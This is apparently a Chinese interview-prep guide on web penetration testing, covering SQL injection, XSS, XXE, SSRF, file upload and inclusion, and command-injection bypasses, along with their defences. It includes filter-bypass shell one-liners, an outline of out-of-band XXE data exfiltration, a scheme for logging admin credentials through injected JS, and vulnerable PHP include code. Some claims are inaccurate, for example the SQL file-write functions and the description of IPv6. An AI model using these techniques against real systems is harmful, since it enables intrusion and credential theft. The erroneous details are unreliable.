# 面试总结

<!--last modify: 20230902-->

[TOC]



# 0x00 基础

## 常见漏洞类型

```shell
# OWAP TOP 10
	1- SQL 注入
	2- 失效的身份认证和会话管理
	3- 跨站脚本攻击 XSS
	4- 直接引用不安全的对象
	5- 安全配置错误
	6- 敏感信息泄露
	7- 缺少功能级的访问控制
	8- 跨站请求伪造 CSRF
	9- 使用含有已知漏洞的组件
	10- 未验证的重定向和转发
# XXE、SSRF、反序列化、文件包含、命令注入
```

## 渗透流程

```shell
1- 信息收集
2- 发现漏洞
3- 验证漏洞-利用漏洞
4- 写渗透测试报告
```

## 常见 Web 攻击防御

```shell
1- 对常见漏洞类型针对性防御
	1.1- 如注入类对输入进行过滤、编码、转义、黑白名单
	1.2- 逻辑漏洞类代码修复
2- 漏扫、基线检查，修复存在的问题
3- 尽可能保持升级更新，打补丁等
4- WAF/IDS/IPS 等安全产品防护
5- 网络层面网络策略防护
```

## 常规加固流程

```shell
# 域 Windows 加固流程：
1- 身份鉴别：
	强化密码策略，包括强制复杂密码、定期更换密码等。另外，可以考虑使用多因素身份验证，如指纹、动态令牌等，以提高账户的安全性。
2- 访问控制：
	关闭默认共享，防止潜在攻击。同时，开启防火墙并设置严格的规则，只允许必要的端口和协议通过。还应使用IP安全策略，防止未经授权的访问。
3- 系统资源控制：
	设定屏幕保护程序，并设定在一定时间无操作后自动锁定屏幕。会话超时限制也是一项重要措施，可以防止长时间无操作的用户账户被攻击。
4- 入侵防御：
	开启防火墙并设置规则，限制不必要的网络流量。同时，使用防病毒软件进行全面的系统扫描和监控，确保系统无病毒或恶意软件。
5- 安全配置：
	对系统进行安全配置，包括禁用不必要的服务和应用程序，减少潜在攻击面。定期更新系统和软件补丁，以修复已知漏洞。
6- 数据备份：
	定期备份重要数据，以防数据丢失或损坏。备份数据应存储在安全的地方，如独立的物理设备或云存储。
7- 安全意识和培训：
	对员工进行安全意识和培训，教导他们如何识别并避免网络钓鱼、恶意软件等安全威胁。
8- 安全审计：
	定期进行安全审计，检查系统的日志和事件，识别潜在的安全问题。对于发现的问题，及时进行修复和改进。
```

## 常规应急响应流程

```shell
# 常规应急响应流程通常包括以下步骤：
1. 预防措施：在应急事件发生之前，建立有效的预防措施是至关重要的。这包括进行风险评估、制定和实施安全策略、建立监控系统等。通过这些措施可以尽量减少应急事件的发生概率和影响程度。
2. 事件检测和评估：及早发现和准确评估应急事件是应急响应的关键。通过实施监控系统、安全检查和日常巡检等手段，快速检测到潜在的安全问题。一旦发现异常情况，应立即进行评估，确定事件的严重程度和影响范围。
3. 通知和警报：一旦确定存在应急事件，通知相关团队和人员进行响应是必要的。这可以通过发送警报通知、电话通知、钉钉、邮件等方式通知适当的人员。确保通知到位，以便有效地组织和协调应急响应工作。
4. 应急响应计划启动：在通知相关人员后，启动应急响应计划。该计划应包括指导在应急事件期间采取的行动，包括任务分配、沟通协调、资源调配等。确保团队成员了解其角色和职责，并立即采取适当的措施应对事件。
5. 事件分析和确认：在应急响应过程中，进行事件分析是至关重要的。了解事件的起因、原因和扩散过程，以及可能的影响和后果。通过分析确定问题的根源，并采取适当的措施进行控制和解决。
6. 应急控制和恢复：针对应急事件，采取控制措施是必要的。这可能包括隔离受影响的系统、关闭漏洞、修复损坏的设备等。同时，紧急恢复计划也应该开展，以便在最短时间内恢复正常运营。
7. 事后总结和改进：应急事件结束后，进行事后总结和评估是为了从中吸取经验教训并改进应急响应能力。通过对应急事件的评估，识别不足之处，提出改进建议，并更新应急计划和预防措施，以加强未来的应急响应能力。
# 请注意，这只是一般应急响应流程的概述，具体的步骤可能因组织和事件类型而有所不同。在实际应急响应中，根据不同的情况和要求，可能需要添补或调整一些步骤。
```

## 0x00x000 SQL 注入原理

```shell
# WEB 应用程序对用户输入的数据
# 没有过滤或者过滤的不严谨
# 并且把用户输入的数据当作SQL 语句
# 带入到数据中去执行
```

## 0x00x001 SQL 注入分类

```shell
# 从反馈结果来分
	1- 回显型
	2- 无回显型/盲注
# 从攻击手法上来分
	1- 联合查询注入 union select
	2- 堆叠注入
	3- 报错注入 updatexml、floor、extravalue、join 其他的用的不多不用说
	4- 盲注
		4.1- 布尔盲注
		4.2- 时间盲注

```

## 0x00x002 SQL 注入防御

```shell
# 代码层防御
	1- 对用户输入的内容进行转义 (PHP 中addslashes()、mysql_real_escape() 函数)
	2- 限制关键字的输入 (PHP 中preg_replace() 函数正则替换关键字)，限制输入的长度
	3- 使用 SQL 语句预处理，对 SQL 语句首先进行预编译，然后进行参数绑定，最后传入参数
# 网络层面
	部署防护墙和软硬 WAF
```

## 0x00x003 SQL 注入疑问

```shell
# 禁用sleep() 函数如何处理
	1- 使用拥有同样功能的函数代替，如 benchmark() 函数

# SQL 注入写文件函数
	1- FILE_GET_contents()
	2- FILE_PUT_contents()

# 延时注入如何判断
	1- 响应时间：对比正常情况下响应时间和注入后响应时间，存在明显延迟则可能存在延时注入
	2- 服务器日志：分析服务器日志，查看是否存在因注入而产生的异常或错误日志，可能提供有关延时注入的线索
	3- 响应内容：对比正常情况和注入后的响应内容，看是否存在返回结果的差异。如正常情况返回结果是数字，在注入后返回结果是字符串或其他不符合常规返回结果的类型，这可能表示存在延时注入
```

## 0x00x004 SQL 注入过 bypass

```shell
1- 大小写、内联注释、关键字替换等
2- 等量替换
3- 参数污染 HPP
4- 编码绕过
5- SQL 特性
```

## SQL 注入 附加

### 00x00 如何突破注入时字符被转义

```shell
# 单引号被过滤怎么办 单改双或加反斜杠
1- 逆向思维：尝试使用相反的转义操作，如将单引号改双引号，双引号改单引号
2- 插入特殊字符：尝试插入特殊字符（如反斜杠）绕过转义操作
3- 使用其他字符集：尝试使用不同字符集或编码方式进行注入，如 UTF-8、ISO-8859-1 等
4- 使用其他注入技术：尝试使用其他类型的注入技术，如布尔盲注或时间注入
5- 暴力破解：尝试使用不同的输入组合绕过转义操作
```

### 00x01 宽字节注入产生原理、原因、防御

```shell
# 原理：
	- 利用数据库编码与操作系统的宽字节字符集（如 GBK）间的差异。在 GBK 编码中某些字符的宽字节表示形式与单字节字符不同。攻击者通过在输入中插入特殊字符，使数据库解析时出现错误，导致 SQL 注入或数据泄露等安全问题
# 原因：
	- 数据库未对用户输入进行正确编码转义，导致输入特殊字符在解析时产生错误。如当数据库使用 GBK 编码时，若用户输入数据中包含 GBK 编码中的宽字节字符，而数据库未正确转义处理，解析时就会产生错误。攻击者可利用错误构造特定输入执行未授权的 SQL 语句或获取数据库中的敏感数据
# 防御：
	1- 对用户输入进行严格验证和过滤，确保输入符合预期格式和编码要求
	2- 对数据库查询语句进行参数化处理，避免直接拼接用户输入
	3- 使用适当转义函数对用户输入转义处理，确保输入特殊字符正确被解析和转义
	4- 及时更新数据库和操作系统的安全补丁，修复可能存在的漏洞
	5- 配置安全的数据库权限和访问控制策略，限制对敏感数据的访问和操作
```

### 00x02 SQL 注入是否可直接 order by

```shell
# 注入时不用and/or/xor，直接 order by 是否可以
	1- and/or/xor，1=1/1=2 为判断是否存在注入点，若已确定注入点可省略
```

### 00x03 如何加快盲注速度

```shell
1- dnslog
2- sqli-less9
3- 二分法
4- 二进制延时注入
```

### 00x04 对某防注入系统注入时会提示

```shell
系统检测到你有非法注入的行为。
    已记录您的ip xx.xx.xx.xx
    时间:2016:01-23
    提交页面:test.asp?id=15
    提交内容:and 1=1
# 如何利用这个防注入系统拿 shell
	1- URL 里直接提交一句话，网站会将一句话记录进数据库文件
	2- 可尝试寻找网站配置文件，上菜刀连接
```

### 00x05 对 indext.php?id=AjAxNg== 变形注入

```shell
1- DATA 可能经过 base64 编码再传入服务器，要对参数进行 base64 编码才能正确完成测试
```

### 00x06 CRLF 注入原理

```shell
# CRLF（Carriage Return Line Feed） 攻击者通过在输入中注入特殊 CRLF 字符序列，可绕过应用程序输入验证和过滤机制进而执行恶意操作
# CRLF 注入漏洞又称 HTTP 响应拆分漏洞（HTTP Response Splitting），攻击方式是将回车符、换行符注入到 HTTP 响应包中
HTTP 响应包通常以两个换行符，去划分响应头与响应正文两部分。当用户的操作足以控制响应头内容时，将会出现 CRLF 漏洞

回车符(CR，ASCII 13，\r，%0d)
换行符(LF，ASCII 10，\n，%0a)

换行符的作用：在 HTTP 协议中，换行符（CRLF）用于分隔请求和响应中的头部和正文
攻击的影响：由于换行符的存在，攻击者可利用 CRLF 注入进行各种攻击，包括但不限于以下几种：
	HTTP 响应拆分：可通过注入 CRLF 拆分 HTTP 响应，插入额外恶意响应内容，如恶意脚本、重定向或欺骗性链接。可能导致钓鱼攻击、会话劫持等安全问题
	HTTP 头注入：可通过注入 CRLF 修改 HTTP 响应头，包括设置 Cookie、重定向地址等，从而劫持用户会话或执行其他恶意操作
	HTTP 响应截断：可利用 CRLF 注入终止 HTTP 响应头处理，导致应用程序后续代码被忽略或误解析，从而执行未经授权的操作
```

## 0x00x005 XSS 原理

```shell
# 攻击者通过向站点网页插入恶意 JS 代码，引导用户访问页面时，恶意脚本会被执行；
1- XSS 漏洞是跨站脚本攻击
2- HTML代码的注入
3- 通过对网页，注入浏览器可执行的代码，从而实现的攻击手段。
```

## 0x00x006 XSS 分类、区别

```shell
# 反射型：
	攻击者将恶意脚本注入到 URL 参数中，当用户点击该 URL 时，恶意脚本会被执行；
# 存储型：
	攻击者将恶意脚本注入到 Web 应用程序的数据库中，当用户访问包含该恶意脚本页面时，恶意脚本会被执行；
# DOM 型：
	攻击者将恶意脚本注入到 Web 页面的 DOM 中，当用户访问包含该恶意脚本页面时，恶意脚本会被执行；
	
# 反射型 和 存储型
	都需需要经过服务器解析，并与数据库产生交互
# DOM 型
	只需要经过前端解析，不与数据库产生交互
# 存储型 和 DOM 型
	都会将攻击代码长期存在受害者服务器
#  反射型
	而反射型，只会反弹一次攻击代码
```

## 0x00x007 XSS 防御

```shell
1- 禁用浏览器 JavaScript 访问带有 HttpOnly 属性的 Cookie
2- 输入检查
	-2.1 对输入进行过滤、转义、编码，包括特殊字符(如<、>、'、"等)
3- 输出检查
	-3.1 安全编码函数
4- 使用 Web 应用程序防火墙（WAF）识别和阻止 XSS 攻击
5- 软件和 Web 应用程序保持最新版本，许多 XSS 漏洞可通过最新安全补丁解决
```

## XSS 附加

### 00x00 如何使用 XSS 长久控制目标站点

```shell
# 在有shell的情况下，如何使用 XSS 实现对目标站长久控制
	1- 后台登录处加一段记录登录账号密码的 JS，且判断是否登录成功
	2- 登录成功，将账号密码记录到生僻路径的文件中，或发送到自己网站文件中
# (此方法适合有价值且需深入控制权限的网络)
# 在登录后才可访问的文件中插入XSS脚本
```

### 00x01 XSS 蠕虫产生条件

```shell
# XSS（跨站脚本）蠕虫是一种利用网页上存在的安全漏洞，在用户访问包含恶意脚本的页面时自动传播恶意代码。产生 XSS 蠕虫条件如下：
	1- 存在跨站脚本漏洞：网站或应用程序中存在未充分过滤或验证用户输入的地方，使得攻击者可在页面中插入恶意脚本
	2. 可执行的恶意代码：攻击者必须能够在受攻击网站上执行恶意代码，可通过利用网站漏洞或操纵用户行为实现，如在评论框、搜索框或用户提交表单中注入恶意代码
	3. 自动传播机制：XSS 蠕虫需能自动传播，使得恶意代码在用户间进行传递。可通过操纵网页中的链接、重定向或其他交互元素来实现
	4. 用户访问：XSS 蠕虫是以用户为中心的，用户必须访问包含恶意代码的网页。攻击者可通过欺骗用户点击恶意链接、发送恶意电子邮件、利用社交工程等方式引导用户访问受感染的页面
```

## 0x00x008 XXE 原理

```shell
# XXE 漏洞就是 XML 外部实体注入漏洞
通常和危害一起回答出来会感觉更加流畅和自然
# 通常发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，
	导致可加载恶意外部文件，
	造成文件读取、
	命令执行、
	内网端口扫描、
	攻击内网网站、
	发起 DOS 攻击等危害。
```

## 0x00x009 XXE 分类

```shell
1- 有回显型 XXE
2- 无回显型 XXE
```

## 0x00x010 XXE 引入方式

```shell
1- 本地映入
2- 外部引入
3- 外部参数实体引入
```

## 0x00x011 XXE 盲注处理

```shell
# XXE 无回显注入，可选择使用 DNS 外带和 外部参数实体注入
1- 在攻击者自己的公网服务器，准备一个test.dtd 通过 base64 为将读取的内容加密得到的值当作传参值，发送给攻击者的公网服务器
2- 受害者那边，通过外部参数实体注入 访问攻击者公网服务器下的 test.dtd 文件
3- 最后看，攻击者公网服务器的日志，转码得到受害者服务器的内容
```

## 0x00x012 CSRF 利用条件

```shell
1- 用户在统一浏览器下
2- 未关闭浏览器情况下
3- 访问攻击者精心伪装好的网页或恶意链接
```

## 0x00x013 CSRF 防御

```shell
# 作验证
	1- 验证 Referer
	2- 添加 Token
	3- 关键地方验证码验证
	4- 尤其是修改密码，要验证旧密码
```

## 0x00x014 SSRF 原理

```shell
1- 服务器允许向其他服务器获取资源
2- 但未对该地址做严格过滤和限制
3- 导致攻击者可向受害者服务器传入任意 URL 地址，并将数据返回
```

## 0x00x015 SSRF 利用方式及危害

```shell
# 攻击者利用该漏洞可让服务器发起未经授权的请求，可能导致敏感信息泄露、内网访问、服务拒绝等问题。下面是常见的 SSRF 利用方式：
内网、本地端口扫描，获取开放端口信息
主机信息收集，Web 应用指纹识别，获取服务 Banner 信息
根据识别出的应用针对性的发送 payload 攻击，如 Struts2
攻击内网和本地的应用程序及服务
穿越防火墙
利用 file 协议读取本地文件，比如 file:///etc/passwd

1. 通过指定 URL：攻击者在目标应用程序的输入参数中，指定一个带有服务器端需要请求的URL的参数值。服务器会读取该参数并发送请求。攻击者可以将目标定为内部网络的非公开地址或其他敏感服务。
2. 通过 IP 地址：攻击者可以直接在输入参数中指定IP地址，绕过DNS解析，让服务器直接请求指定的IP。
3. 绕过防火墙和安全限制：攻击者可以使用SSRF来绕过防火墙或安全限制，让服务器访问被安全限制的资源。例如，绕过防火墙访问内部管理接口、配置文件或敏感信息等。
4. 利用协议：攻击者可以通过指定特定的协议（如file://、dict://、gopher://等），使服务器发起非标准的请求，访问文件系统、访问内部协议、读取敏感数据等。
5. SSRF与其他漏洞组合利用：攻击者可以将SSRF与其他漏洞结合，例如本地文件包含（LFI）、远程代码执行（RCE）等，以进一步获取敏感信息或进行攻击。
# 为防止 SSRF 攻击，应谨慎处理用户输入，并采取以下措施：限制用户输入的URL和IP范围、过滤不信任的协议和URL，设置白名单，使用安全沙盒机制等。同时，合理配置服务器的权限和访问控制，限制服务对内部网络的访问，并使用Web应用防火墙来检测和阻止SSRF攻击。

# 危害
1- SQL 注入
2- Sturts2
3- 端口探测
4- 敏感信息泄露
# 最为主要的是能够访问到外网无法访问的系统和服务器，漫游内网
```

## 0x00x016 SSRF 防御

```shell
1- 地址做白名单处理
2- 域名识别 ip，过滤内部 ip
3- 并校验返回内容对比是否与假定的一致
```

## 0x00x017  CSRF 和 XSS 和 XXE 区别与修复

```shell
# XSS
	1- 跨站脚本攻击，用户提交的数据中可构造代码执行，实现窃取用户信息等攻击
	2- 修复方式：对字符实体转义、HTTP Only 禁止 JavaScript 读取 Cookie 值、输入校验、浏览器与 Web 应用端采用相同字符编码
# CSRF
	1- 跨站请求伪造攻击，XSS 是实现 CSRF 诸多手段中的一种，由未在关键操作执行时进行是否由用户自愿发起的确认
	2- 修复方式：筛选需防范 CSRF 的页面然后嵌入 Token、再次输入密码、检验 Referer
# XXE
	1- XML 外部实体注入攻击，XML 中可通过调用实体来请求本地或远程内容，和远程文件保护类似，会引发相关安全问题，如敏感文件读取
	2- 修复方式：XML 解析库在调用时严格禁止对外部实体的解析
```

## 0x00x018 CSRF、SSRF 和重放攻击区别

```shell
# CSRF 是跨站请求伪造攻击，由客户端发起
# SSRF 是服务器端请求伪造，由服务器发起
# 重放攻击 是将截获的数据包进行重放，达到身份认证等目的
```

## XML 附加

### 00x00 img 标签获取管理员路径方法

```shell
# img 标签除 onerror 属性外获取管理员路径方法
	1- onerror 属性
	2- src 指定远程脚本文件，获取 Referer
```

### 00x01 Cookie 相关

```shell
# Cookie 存储位置，浏览器客户端上
	1- 可保存在运行内存中（浏览器关闭 Cookie 即小时）
	2- 保存在硬盘文件中（设置有保存机制，如n day 免登录机制）
# XSS 如何盗取 Cookie
	1- 攻击者在网页中插入恶意脚本
	2- 引诱用户访问包含恶意脚本的网页
	3- 恶意脚本自动将用户 Cookie 信息发送到攻击者服务器
# XSS 有 Cookie 就能无用户名、密码登录吗
	1- 不一定，Cookie 只是一种存储在客户端关于用户身份和会话状态信息的数据
	2- 服务器仍需通过其他方式需验证身份
```

### 00x02 Session 工作原理

```shell
1- 用户首次访问 Web 应用时，自动生成一个唯一 Session ID，将此 Session ID 以 Cookie 形式返给浏览器
2- 在用户浏览器中生成一个名为 sessionid 的 Cookie（名字可配置），包含 Session ID
3- 当用户访问 Web 应用其他页面时，浏览器自动将 Cookie 中 Session ID 发送给服务器端
4- 服务器端收到请求，反序列化 Session ID 查找对应 Session 对象
5- 若找到对应 Session，服务器端即根据 Session 中保存的数据处理请求，若未找到对应 Session，服务器端可能会创建新的 Session
6- 当 Session 中数据发生变化时，服务器端会持久化数据，确保用户刷新页面或打开新窗口时数据不会丢失
7- 当用户关闭浏览器，Session 或者 Session ID 即被销毁，表示用户本次会话结束

# 注意
	1- Session 过期时间一般会设置，过期 Session 在服务器端即被销毁
	2- Web 应用也可手动创建和销毁 Session，使开发人员更加灵活地管理和使用 Session
```

### 00x03 Cookies 和 Session 区别

```shell
1- 数据存储位置：Cookie 数据存客户端浏览器上，Session 数据存服务器上
2- 安全性：Cookie 不是很安全，攻击者可分析 Cookie 进行 Cookie 欺骗，考虑安全应使用 Session
3- 存储容量：单个 Cookie 保存数据 ≤ 4KB，单站点最多保存 20 个；Session 无上限，对服务器端性能考虑 Session 不要存过多，并设置 Session 删除机制
4- 存取方式：Cookie 中只保管 ASCll 字符串，需通过编码方式存取 Unicode 字符或二进制数据；Cookie 难以实现存储略微复杂信息
5- 隐私策略：Cookie 对客户端可见，攻击者可分析 Cookie 进行 Cookie 欺骗
6- 有效期：
	6.1- 开发可通过设置 Cookie 属性，达到 Cookie 长期有效
	6.2- Session 依赖 JSESSIONID 的 Cookie，而 Cookie JSESSIONID 过期时间默认为 -1，关闭窗口 Session 就失效，即 Session 不能达到长期有效效果
7- 服务器压力：
	7.1- Session 是保管在服务端的，每个用户都会产生一个 Session，如并发访问用户十分多，会产生十分多的 Session，耗费大量的内存
	7.2- Cookie 是保管在客户端，不占用服务器资源，对于并发用户十分多的网站，cookie 是很好的选择
8- 跨域支持：
	8.1- Cookie 支持跨域名访问；
	8.2- Session 则不支持跨域名访问
```

## 0x00x019 文件上传分类

```shell
1- 白名单
2- 黑名单
```

## 0x00x020 文件上传 bypass

```shell
# 前端 JS 突破：
	1- 前端 JS 绕过，文件名大小写绕过，抓包修改文件后缀名，双重后缀名突破 或 禁用当前浏览器 JS 脚本
	2- 中间件解析漏洞绕过
# 后端突破：
	1- 黑名单：点、空格点、换行符、php 1234567、phphtml、分布式文件上传、文件流绕过 ....
	2- 白名单：00 截断、路径截断、时间竞争、双文件上传、双文件名 ...
```

## 文件上传 附加

### 00x00 审查上传点的元素有何意义

```shell
1- 防止恶意行为：
	有些站点上传文件类型限制是在前端实现，这时只要增加上传类型就能突破限制。审查上传点元素，可防止恶意用户上传恶意文件，避免对服务造成安全威胁
2- 文件的合法性：
	审查上传点元素可判断上传文件是否符合规定格式，如图片必须符合图片格式、大小、分辨率等要求，确保上传文件是否合法，以维护网站质量和声誉
3- 提高用户体验：
	审查上传点元素可过滤不符合要求的不合法文件，避免用户上传不合法文件后无法在网站上正常显示或使用，从而提高用户体验
```

### 00x01 目标站上传图片正常，脚本异常原因

```shell
# 目标站无防护，上传图片可正常访问，上传脚本格式访问则 403，什么原因？
	1- 目标站禁止脚本权限访问和执行，只允许静态文件访问，如 html、htm、jpg、gif 等格式。
	2- 目标站可能使用防火墙或其他安全机制来限制访问和执行脚本，为防止恶意脚本在网站上运行或对网站造成潜在威胁
	3- 目标站可能有文件类型白名单或限制，只允许特定类型文件上传和访问，脚本文件可能不在白名单中
	4- 目标站可能有上传文件大小限制，若脚本文件超过限制则可能会收到 403 错误
	5- 目标站可能使用某些过滤技术，如文件名检查或内容检查，以检测可能的恶意活动。若脚本文件被认为是潜在威胁，可能会被阻止并收到 403 错误
```

## 0x00x021 PHP 本地文件包含 (LFI) 漏洞原理

```shell
# LFI（本地文件包含）漏洞是一种安全漏洞，通常出现在使用服务器端脚本语言如 PHP 网站或应用程序中
# 漏洞原理是未充分过滤或验证用户输入的文件路径参数，在读取本地文件时可被攻击者滥用，使攻击者能够读取服务器上的敏感文件
# 工作原理：
	1- 用户输入漏洞点：LFI 漏洞出现在网站或应用程序中存在可接收用户输入的地方，如 URL 或请求参数
	2- 读取文件路径：攻击者通过输入特殊文件路径参数，如 "../" 或 "%00"，绕过正常文件路径验证
	3- 文件包含：服务器端脚本（如 PHP）将用户输入的文件路径与本地文件拼接在一起，并尝试读取这个文件
	4- 敏感文件读取：若服务器端无适当安全措施，攻击者可构造恶意文件路径参数使服务器读取和返回敏感文件的内容，如密码文件、配置文件、用户数据库等
# 防御措施：
	1- 输入验证和过滤：对用户输入进行严格过滤和验证，确保输入文件路径参数只包含有效字符和结构
	2- 使用白名单机制：限制可访问文件路径范围，使用白名单来阻止对敏感文件的访问
	3- 对文件路径规范化：在拼接文件路径前，对用户输入文件路径规范化处理，确保文件路径正确性和安全性
	4- 文件权限控制：服务器上的敏感文件应设置适当的权限，限制对这些文件的读取和执行
# 漏洞代码：
<?php include($_GET['f']);?>
或
<?php
$page = $_GET['page'];
include($page . ".php");
?>
# 手工挖掘 LFI 漏洞
	1- 审查代码：利用用户输入点，审查应用程序中所有使用包含文件的函数、功能或语句的代码，如 include, require, include_once, require_once 等
	2- 黑名单限制：检查代码中是否有限制可包含文件路径的逻辑，如只允许包含指定目录下的文件，或限制路径中不允许出现"../"等特殊字符
	3- 构造恶意输入：尝试通过注入文件路径参数包含恶意文件。可尝试使用相对路径（../）访问父目录下文件，或使用绝对路径来引用任意文件
	4- 获取回显：观察应用程序是否在页面上显示包含的文件内容。成功显示恶意文件的内容说明存在 LFI 漏洞
	# 5- 安全审计工具：使用安全审计工具对代码进行扫描，以发现潜在 LFI 漏洞
# 若无报错回显，如何遍历文件
	1- 尝试已知敏感文件：可尝试包含已知敏感文件，如配置文件（如 mysql 配置文件）或其他含有敏感信息的文件
	2- 使用编码绕过：可尝试使用编码技巧（如 URL 编码、双重编码等）绕过过滤机制，获取访问限制的文件
	3- 字典爆破：可构建包含常见文件名的字典，尝试将每个文件名用作 LFI 漏洞中的参数进行遍历
		可尝试使用常见的文件路径，如 "../index.php"、"../config.php" 等，以尝试读取存在漏洞网站中的敏感文件
		可尝试使用常见的文件名，如 "index.php"、"config.php"、"functions.php" 等，以尝试读取存在漏洞网站中的敏感文件
		可尝试使用常见的目录名称，如 "includes"、"classes"、"plugins" 等，以尝试读取存在漏洞网站中的敏感文件
		可尝试枚举网站的文件目录结构，如通过发送类似 "/admin"、"/includes/" 等路径来获取网站的文件目录结构信息
```

## 文件包含 附加

### 00x00 文件包含伪协议

```shell
1- file://		访问本地文件系统
2- http://		访问 HTTPS 网址
3- ftp://		访问 FTP URL
4- php://		访问输入输出流
5- zlib://		压缩流
6- data://		数据
7- ssh2://		security shell2
8- expect://	处理交互式的流
9- glob://		查找匹配的文件路径
```

### 00x01 文件包含函数

```shell
include()：遇到错误生成警告，继续执行脚本
require()：遇到错误生成致命错误，脚本继续
include_once()：若文件已包含，则不再包含，一定程度避免错误
require()_once()：若文件已包含，则不再包含，一定程度避免错误
fopen()：文件读取函数
file_get_contents()：文件读取函数
```

## 0x00x022 命令执行 bypass

```shell
# 任意命令执行的方式
	1- 利用操作系统命令注入漏洞
	2- 利用应用程序逻辑漏洞

# 管道符号绕过
# 空格绕过
	${IFS}
# %0a、%09
# 重定向绕过
	< <>
# 变量拼接绕过
	@kali:$ a=c;b=at;c=fl;d=ag;$a$b $c$d
# 单引号、双引号绕过
    ca''t flag
	cat"" flag
# 编码绕过
	# $(printf "\x63\x61\x74\x20\x2f\x66\x6c\x61\x67") ==>cat /flag
	# {printf,"\x63\x61\x74\x20\x2f\x66\x6c\x61\x67"}|\$0 ==>cat /flag
	# $(printf "\154\163") ==>ls
	# $(printf "\154\163")
# 查看等价替换
	(1) more: 按页显示文件内容
	(2) less: 与 more 类似，可[pg dn][pg up] 翻页
	(3) head: 查看头几行
	(4) tac: 从最后一行开始显示，cat 的反向显示
	(5) tail: 查看尾几行
	(6) nl：显示时顺便输出行号
	(7) od: 以二进制方式读取文件内容
	(8) vi: 编辑器，也可查看
	(9) vim: 编辑器，也可查看
	(10) sort: 可查看
	(11) uniq: 可查看
	(12) file -f: 报错出具体内容
# 反斜线绕过
	c\at fl\ag
# 内敛注释绕过
	# `命令` 和 $(命令) 都是执行命令的方式
	echo "m0re`cat flag`"
	echo "m0re $(cat flag)"
# base64 编码绕过
	`echo "Y2F0IGZsYWc="|base64 -d`
# 绕过长度限制
	# >命令会将原有文件内容覆盖
	echo '123'>xxoo.txt
# >> 将字符串添加到文件内容末尾，不覆盖原内容
	echo '233'>>xxoo.txt
# 命令换行绕过
	ca\
	a\
	t\
	fl\
 	ag
```

### 00x00 PHP 命令执行函数

```shell
# 在 PHP 中，一些常用的函数与命令执行相关，包括但不限于以下几个：
	1- exec(): 用于执行外部命令，并将命令的输出作为字符串返回
	2- shell_exec(): 与exec()类似，用于执行外部命令，但是将命令的完整输出作为字符串返回
	3- system(): 执行外部命令，并将命令的输出直接打印到标准输出
	4- passthru(): 执行外部命令，并将命令的输出直接发送到标准输出

# - 最好避免使用这些函数，而是使用更安全的替代方法，比如特定的系统调用或库函数。
# - 对传递给这些函数的参数进行严格的输入验证和过滤，以防止攻击者利用命令注入漏洞。
# - 尽量不要将用户提供的数据直接传递给这些命令执行函数，而是使用安全的参数化查询或包装器函数。
# - 在执行命令之前，考虑使用禁用shell特殊字符、设置环境变量以及临时切换工作目录等安全措施。
```

## 0x00x023 业务逻辑漏洞及修复

```shell
# 密码找回漏洞
	1- 密码允许暴力破解
	2- 通用型找回凭证
	3- 可跳过验证步骤
	4- 找回凭证可拦包获取
	5- 前端返回
等方式来通过厂商提供的密码找回功能来得到密码
# 身份认证漏洞
	1- 会话固定攻击
	2- Cookie 仿冒
只要得到 Session 或 Cookie 即可伪造用户身份
# 验证码漏洞
	1- 验证码允许暴力破解
	2- 验证码可通过 Javascript 或改包的方法绕过
	3- 空值绕过
	4- 验证码的值可控
```

### 00x00 找回密码利用

```shell
# 目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，如何利用
	1- 爆破用户名，利用被爆破出的用户名爆破密码
	2- 有些站点在登陆处也会这样提示
	3- 所有和数据库有交互的都可能有注入
```

### 00x01 原密码显示*，如何读取用户密码

```shell
# 后台修改管理员密码处原密码显示为*。该怎样读出用户的密码
	1- 审查元素，将密码处 password 属性改为 text 即可明文显示
```

## 0x00x024 未授权访问漏洞

```shell
# 常见的未授权访问漏洞：
	1- Redis 未授权访问漏洞
	2- MongoDB 未授权访问漏洞
	3- Jenkins 未授权访问漏洞
	4- Memcached 未授权访问漏洞
	5- JBOSS 未授权访问漏洞
	6- VNC 未授权访问漏洞
	7- Docker 未授权访问漏洞
	8- ZooKeeper 未授权访问漏洞
	9- Rsync 未授权访问漏洞
	10- Atlassian Crowd 未授权访问漏洞
	11- CouchDB 未授权访问漏洞
	12- Elasticsearch 未授权访问漏洞
	13- Hadoop 未授权访问漏洞
	14- Jupyter Notebook 未授权访问漏洞
```

>参考链接： https://xz.aliyun.com/t/6103
>
>参考链接：https://paper.seebug.org/409/
>
>参考链接： https://www.freebuf.com/articles/web/207877.html

## 0x00x025 代码执行/文件读取/命令执行函数

```shell
# 代码执行：
	1- eval
	2- preg_replace+/e
	3- assert
	4- call_user_func
	5- call_user_func_array
	6- create_function
# 文件读取：
	1- file_get_contents()
	2- highlight_file()
	3- fopen()
	4- read()
	5- file()
	6- fread()
	7- fgetss()
	8- fgets()
	9- parse_ini_file()
	10- show_source()
	11- file()
# 命令执行：
	1- system()
	2- exec()
	3- shell_exec()
	4- passthru()
	5- pcntl_exec()
	6- popen()
	7- proc_open()
```

## 0x00x026 怎样信息收集

```shell
1- 收集域名信息
2- Whois 查询
3- 备案信息查询
4- 敏感信息
5- 子域名信息
6- 收集常用端口信息
7- 指纹识别
8- 查找真实 IP
9- 敏感目录文件
```

## 0x00x027 系统、协议

```shell
# 手工判断系统类型
	Linux 大小写敏感，Windows 大小写不敏感

- OSI 七层模型：应用层、表示层、会话层、传输层、网络层、数据链路层、物理层；
- 常见协议 / 端口：
  - TCP/IP、ARP、SNMP、DHCP、DNS、ARP、IGMP；
- HTTP 请求头：User-Agent、Referer、Host

虚拟专用网络/二层交换机/三层交换机/路由技术

# IPv6 地址 十六进制表示和十进制表示。
十六进制表示是将 IPv6 地址的 128 位二进制数据分成 8 组，每组 16 位，用十六进制数表示，每组之间用冒号分隔
十进制表示是将 IPv6 地址的 128 位二进制数据分成 8 组，每组 16 位，用十进制数表示，每组之间用冒号分隔
```

## 协议 附加

### 00x00 重要协议分布层

```shell
# 在计算机网络中，分布层是网络分层体系结构中的一层，旨在处理网络中不同地理位置的主机之间的通信。在分布层中，有几个重要的协议用于实现各种网络功能。以下是一些在分布层中常见且重要的协议：
1. Border Gateway Protocol (BGP)：BGP是用于在不同自治系统（AS）之间进行路由选择的协议。它帮助在Internet环境中实现跨网络的可靠通信。
2. Intermediate System to Intermediate System (IS-IS)：IS-IS是一种内部网关协议（IGP），用于在具有层次结构的网络中进行路由。它通常用于大型企业和互联网服务提供商（ISP）的骨干网络。
3. Open Shortest Path First (OSPF)：OSPF也是一种内部网关协议，用于在IP网络中计算和选择最佳路径。它通过使用链路状态路由算法来支持动态路由。
